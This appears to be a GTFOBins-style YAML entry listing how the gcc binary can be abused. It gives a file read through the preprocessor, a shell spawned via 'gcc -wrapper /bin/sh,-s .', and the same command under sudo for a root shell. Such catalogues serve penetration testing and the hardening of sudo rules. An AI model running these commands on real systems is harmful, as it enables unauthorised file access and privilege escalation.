---
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        gcc -x c -E "$LFILE"
  shell:
    - code: gcc -wrapper /bin/sh,-s .
  sudo:
    - code: sudo gcc -wrapper /bin/sh,-s .
---
